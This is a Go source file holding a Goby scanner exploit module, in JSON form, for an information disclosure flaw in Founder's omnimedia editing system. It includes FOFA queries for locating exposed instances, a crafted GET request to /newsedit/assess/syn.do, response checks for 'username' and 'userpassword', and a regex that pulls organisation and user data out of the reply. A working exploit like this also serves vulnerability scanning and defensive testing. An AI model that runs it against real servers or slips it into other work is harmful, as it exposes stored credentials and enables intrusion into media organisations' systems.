package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Fangzheng Full Media Editing System /newsedit/assess/syn.do Information Disclosure Vulnerability",
    "Description": "<p>Peking University Founder's Omnimedia Editing and Publishing System is a technology platform aimed at deep media integration. It is supported by big data and AI technologies and integrates multiple core functions, including a command center, collection center, editing center, and publishing center. The system realizes the entire process of multimedia operations, from topic planning and reporting coordination to integrated publication.</p><p>The attacker reads the sensitive information of the system by constructing a special URL address.</p>",
    "Product": "Fangzheng Full Media Editing System",
    "Homepage": "http://www.founder.com.cn/",
    "DisclosureDate": "2024-10-12",
    "PostTime": "2024-11-07",
    "Author": "1971714067@qq.com",
    "FofaQuery": "body=\"/newsedit/newsedit/css/login_1.css\" || (title==\"方正畅享全媒体报道指挥平台\" && body=\"common/js/jquery.1.7.2.min.js\") || title=\"全媒体采编V3.0-工作平台登录\"",
    "GobyQuery": "body=\"/newsedit/newsedit/css/login_1.css\" || (title==\"方正畅享全媒体报道指挥平台\" && body=\"common/js/jquery.1.7.2.min.js\") || title=\"全媒体采编V3.0-工作平台登录\"",
    "Level": "1",
    "Impact": "<p>The attacker reads the sensitive information of the system by constructing a special URL address.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"http://www.founder.com.cn/\">http://www.founder.com.cn/</a></p>",
    "References": [
        "https://mp.weixin.qq.com/s/T-n3lvpdBEoDNXpbe0XYgw"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "content",
            "type": "select",
            "value": "org",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/newsedit/assess/syn.do?type=org",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "username",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "userpassword",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "vulurl|lastbody|variable|{{{fixedhostinfo}}}/newsedit/assess/syn.do?type=org"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/newsedit/assess/syn.do?type={{{content}}}",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "contains",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "username",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "userpassword",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|<orgs>(.*?)</orgs>"
            ]
        }
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.0",
    "Translation": {
        "CN": {
            "Name": "方正全媒体采编系统 /newsedit/assess/syn.do 信息泄露漏洞",
            "Product": "方正全媒体采编系统",
            "Description": "<p>北大方正全媒体采编系统是一款面向媒体深度融合的技术平台，它以大数据和AI技术为支撑，集成了指挥中心、采集中心、编辑中心、发布中心等多个核心功能，实现了选题策划、报道指挥、融合发布等融媒体业务流程。<br></p><p>攻击者通过构造特殊URL地址，读取系统敏感信息。<br></p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"http://www.founder.com.cn/\">http://www.founder.com.cn/</a><br></p>",
            "Impact": "<p>攻击者通过构造特殊URL地址，读取系统敏感信息。<br></p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "Fangzheng Full Media Editing System /newsedit/assess/syn.do Information Disclosure Vulnerability",
            "Product": "Fangzheng Full Media Editing System",
            "Description": "<p>Peking University Founder's Omnimedia Editing and Publishing System is a technology platform aimed at deep media integration. It is supported by big data and AI technologies and integrates multiple core functions, including a command center, collection center, editing center, and publishing center. The system realizes the entire process of multimedia operations, from topic planning and reporting coordination to integrated publication.<br></p><p>The attacker reads the sensitive information of the system by constructing a special URL address.<br></p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"http://www.founder.com.cn/\">http://www.founder.com.cn/</a><br></p>",
            "Impact": "<p>The attacker reads the sensitive information of the system by constructing a special URL address.<br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "Variables": {},
    "PocId": "9968"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}